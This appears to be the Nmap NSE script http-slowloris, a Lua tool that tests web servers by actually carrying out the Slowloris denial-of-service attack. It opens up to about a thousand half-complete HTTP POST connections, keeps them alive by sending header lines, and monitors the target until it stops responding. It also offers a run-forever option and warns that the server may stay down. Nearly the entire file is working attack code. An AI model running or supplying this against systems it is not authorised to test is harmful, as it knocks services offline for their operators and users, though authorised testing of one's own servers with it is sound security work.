local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"

description = [[
Tests a web server for vulnerability to the Slowloris DoS attack.

Slowloris was described at Defcon 17 by RSnake
(see http://ha.ckers.org/slowloris/).

This script opens and maintains numerous 'half-HTTP' connections until
the server runs out of ressources, leading to a denial of service. When
a successful DoS is detected, the script stops the attack and returns
these pieces of information (which may be useful to tweak further
filtering rules):
* Time taken until DoS
* Number of sockets used
* Number of queries sent
By default the script runs for 30 minutes if DoS is not achieved. 

Please note that the number of concurrent connexions must be defined
with the <code>--max-parallelism</code> option (default is 20, suggested
is 400 or more) Also, be advised that in some cases this attack can
bring the web server down for good, not only while the attack is
running.

Also, due to OS limitations, the script is unlikely to work 
when run from Windows.
]]

---
-- @usage
-- nmap --script http-slowloris --max-parallelism 400  <target>
--
-- @args http-slowloris.timeout Time to wait before sending new http header datas
-- in order to maintain the connection. Defaults to 100 seconds.
-- @args http-slowloris.runforever Specify that the script should continue the attack forever.
-- @args http-slowloris.timelimit Specify maximum run time for DoS attack (30 minutes default). 
--
-- @output
-- PORT     STATE SERVICE REASON  VERSION
-- 80/tcp   open  http    syn-ack Apache httpd 2.2.20 ((Ubuntu))
-- | http-slowloris: 
-- |   Vulnerable:
-- |   the DoS attack took +2m22s
-- |   with 501 concurrent connections
-- |_  and 441 sent queries

author = "Aleksandar Nikolic, Ange Gutek"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}


portrule = shortport.http

local runforever =  stdnse.get_script_args('http-slowloris.runforever') or nil

-- get time (in miliseconds) when the script should finish
local function get_end_time()
	local t = nmap.timing_level()
	local limit = stdnse.parse_timespec(stdnse.get_script_args('http-slowloris.timelimit') or "30m")
	local end_time  = 1000 * limit + nmap.clock_ms()
	return end_time 
end

local thread_count = 0 -- this will save the amount of still connected threads
local sockets = 0 -- the maximum amount of sockets during the attack. This could be lower than the requested concurrent connections because of the webserver configuration (eg maxClients on Apache)
local queries = 0 -- this will save the amount of new lines sent to the half-http requests until the target runs out of ressources
local server_notice  
local dosed = false
local stop_all = false

local doHalfhttp = function(host,port,obj)    
	local condvar = nmap.condvar(obj)
	local get_uri = math.random(100000, 900000) -- we will query a random page
	
	if stop_all then
		condvar "signal"
		return
	end
	
	-- create socket
	local slowloris = nmap.new_socket()
	thread_count = thread_count + 1 
	slowloris:set_timeout(200 * 1000) -- set a long timeout so our socked doesn't timeout while it's waiting
	local catch = function()
		-- this connection is now dead
		thread_count = thread_count - 1
		stdnse.print_debug("HALF_HTTP: lost connection")
		slowloris:close()
		slowloris = nil
		condvar "signal"
	end
 
	local try = nmap.new_try(catch)
	try(slowloris:connect(host.ip, port))

	-- Build a half-http header.
	local half_http =   "POST /"..get_uri.." HTTP/1.1\r\n"
	half_http = half_http.."Host: "..host.ip.."\r\n"
	half_http = half_http.."User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
	half_http = half_http.."Content-Length: 42\r\n"
	try(slowloris:send(half_http))
	server_notice = " (attack against "..host.ip.."): HTTP stream started."


	-- during the attack some connections will die and other will respawn. Here we keep in mind the maximum concurrent connections reached.
	if sockets <= thread_count then sockets = thread_count end

	local feed_interval = stdnse.get_script_args("http-slowloris.timeout")
	if feed_interval == nil then feed_interval = 100 end

	-- Maintain a pending HTTP request by adding a new line at a regular 'feed' interval
	while true do
		if stop_all then
			break
		end
		stdnse.sleep(feed_interval)
		try(slowloris:send("X-a: b\r\n"))
		server_notice = " (attack against "..host.ip.."): Feeding HTTP stream..."
		queries = queries + 1
		server_notice = server_notice .. "\n(attack against "..host.ip.."): "..queries.." queries sent using "..thread_count.." connections." 
	end
	slowloris:close()
	thread_count = thread_count - 1
	condvar "signal"
end


-- Monitor the web server 
local doMonitor = function(host,port)
	
	local request_faults = 0 -- keeps track of how many times we didn't get a reply from the server
	stdnse.print_debug("MONITOR: Monitoring " ..host.ip.. " started")
	local request = "GET / HTTP/1.1\r\nHost: "..host.ip 
		  .."\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n\r\n"
	
	local catch = function()
		stdnse.print_debug("MONITOR: " .. " (monitor on ".. host.ip .. "): Monitoring has shut down due to lack of response from the webserver. Server could be down completly." )
		monitor:close()
		request_faults = request_faults +1
		stop_all = true
	end
	
	while not stop_all do
		monitor = nmap.new_socket()
		monitoring = nmap.new_try(catch)
		monitoring(monitor:connect(host.ip, port))		
		monitoring(monitor:send(request))
		local status, data = monitor:receive_lines(1)
		if not status then
			stdnse.print_debug("MONITOR: Didn't get a reply from " .. host.ip  .. "." )
			monitor:close()
			request_faults = request_faults +1
			if request_faults > 3 then
				if runforever == nil then
					stdnse.print_debug("MONITOR: server " .. host.ip .. "is now unavailable. The attack worked.")
					dosed = true
				end
				monitor:close()
				break
			end
		else
			request_faults = 0	
			stdnse.print_debug("MONITOR: "..host.ip.." still up, answer received." )
			stdnse.sleep(10)
			monitor:close()
		end
		if stop_all then
			break
		end
	end
end
	  
local mutex = nmap.mutex("http-slowloris")

local threads = {}

local worker_schedluer = function(host, port)
	local obj = {}
	local condvar = nmap.condvar(obj)
	local i
	for i=1,1000 do -- The real amount of sockets is triggered by the --max-parallelism option. The remaining threads will replace dead sockets during the attack
		local co = stdnse.new_thread(doHalfhttp, host, port,obj)
		threads[co] = true
	end
	
	while not dosed and not stop_all do -- keep creating new threads, in case we want to run the attack indefinitely
		repeat
		condvar "wait"
		if stop_all then
			return
		end
		for thread in pairs(threads) do
			if coroutine.status(thread) == "dead" then 
				threads[thread] = nil 

			end
		end
		stdnse.print_debug("starting new thread")
		local co = stdnse.new_thread(doHalfhttp, host, port,obj)
		threads[co] = true		
		until next(threads) == nil;
	end
end

action = function(host, port)

	mutex "lock" -- we want only one slowloris instance running at a single time even if multiple hosts are specified
				 -- in order to have as many sockets as we can available to this script

	local output={}
	local start,stop,dos_time

	start = os.date("!*t")
	-- The first thread is for monitoring and is launched before the attack threads
	local mon = stdnse.new_thread(doMonitor, host, port)
	stdnse.sleep(2) -- let the monitor make the first request

	
	stdnse.print_debug("MAIN THREAD: starting schedluer")
	local sched = stdnse.new_thread(worker_schedluer, host, port)
    local end_time = get_end_time()
	local last_message
	if not (runforever == nil) then
		stdnse.print_debug("RUNNING FOREVER")
	end
      -- return a live notice from time to time	
	while (nmap.clock_ms() < end_time or not (runforever == nil)) and not stop_all do
		if server_notice ~= last_message then -- don't flood the output by repeating the same info 
			stdnse.print_debug("MAIN THREAD: " .. server_notice)
			last_message = server_notice
		end
		if dosed and runforever == nil then
			break
		end
		stdnse.sleep(10)
	end

	stop = os.date("!*t")
	dos_time = stdnse.format_difftime(stop,start)
	stop_all = true
	if dosed then 
		stdnse.print_debug(2, "%s: Slowloris Attack stopped, building output", SCRIPT_NAME)
		output = "Vulnerable:\n".. "the DoS attack took ".. dos_time .. "\nwith ".. sockets .. " concurrent connections\nand " .. queries .." sent queries"
		mutex "done" -- release the mutex
		return stdnse.format_output(true, output)
	end
	mutex "done" -- release the mutex			
	return false
end
